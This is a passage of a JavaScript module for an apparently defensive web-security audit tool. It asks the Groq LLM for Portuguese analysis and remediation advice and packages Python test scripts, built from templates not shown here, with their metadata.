    .map(r => `- [${r.severity?.toUpperCase()}] ${r.check}: ${r.message}`)
    .join('\n');

  const prompt = `Você é um especialista em Blue Team / testes defensivos de segurança.

Site auditado: ${projectUrl}
Score de segurança: ${score}/100
Vulnerabilidades relevantes encontradas:
${relevantFindings || '- Nenhuma vulnerabilidade crítica encontrada'}

Script sendo gerado: ${scriptId}

Gere em português:
1. Um comentário de análise específico para ESTE site (2-3 linhas) explicando o que o script vai testar especificamente no contexto das vulnerabilidades encontradas
2. Uma lista de 3-4 recomendações de correção específicas para os problemas encontrados

Formato de resposta (APENAS isto, sem markdown extra):
ANALISE: [sua análise em 2-3 linhas]
RECOMENDACOES:
- [recomendação 1]
- [recomendação 2]
- [recomendação 3]`;

  try {
    const response = await callGroq([
      { role: 'system', content: 'Você é especialista em segurança web e Blue Team. Responda de forma concisa e técnica em português.' },
      { role: 'user', content: prompt },
    ], 512);
    return response;
  } catch {
    return `ANALISE: Script de teste para ${projectUrl}\nRECOMENDACOES:\n- Revise as vulnerabilidades encontradas\n- Implemente as correções recomendadas\n- Execute os testes regularmente`;
  }
}

// Função principal — gera todos os scripts
async function generatePythonScripts(auditData) {
  const { projectUrl, results = [], score, grade } = auditData;
  const targetUrl = projectUrl || 'http://target.example.com';

  const selectedIds = selectRelevantScripts(results);
  const scripts = [];

  for (const scriptId of selectedIds) {
    const template = SCRIPT_TEMPLATES[scriptId];
    if (!template) continue;

    // Gera o script Python usando o template
    const pythonCode = template.template(targetUrl);

    // Obtém insights do Groq (pode falhar silenciosamente)
    let insights = null;
    try {
      insights = await generateScriptInsights(auditData, scriptId, template);
    } catch { /* silent */ }

    // Parseia insights
    let analise = '';
    let recomendacoes = [];
    if (insights) {
      const analiseMatch = insights.match(/ANALISE:\s*(.+?)(?=RECOMENDACOES:|$)/s);
      const recoMatch = insights.match(/RECOMENDACOES:\s*([\s\S]+)/);
      if (analiseMatch) analise = analiseMatch[1].trim();
      if (recoMatch) {
        recomendacoes = recoMatch[1]
          .split('\n')
          .filter(l => l.trim().startsWith('-'))
          .map(l => l.replace(/^-\s*/, '').trim())
          .filter(Boolean);
      }
    }

    scripts.push({
      id: scriptId,
      name: template.name,
      category: template.category,
      severity: template.severity,
      description: template.description,
      icon: template.icon,
      dependencies: template.dependencies,
      filename: `${scriptId}.py`,
      code: pythonCode,
      analise: analise || `Script para testar ${template.name.toLowerCase()} em ${targetUrl}`,
      recomendacoes: recomendacoes.length > 0 ? recomendacoes : ['Execute o script e analise os resultados', 'Implemente as correções indicadas'],
      howToRun: `pip install ${template.dependencies.join(' ')} && python ${scriptId}.py ${targetUrl}`,
      linesOfCode: pythonCode.split('\n').length,
    });
  }

  return {
    success: true,
    targetUrl,
    score,
    grade,
    generatedAt: new Date().toISOString(),
    totalScripts: scripts.length,
    scripts,
  };
}

module.exports = { generatePythonScripts, SCRIPT_TEMPLATES };
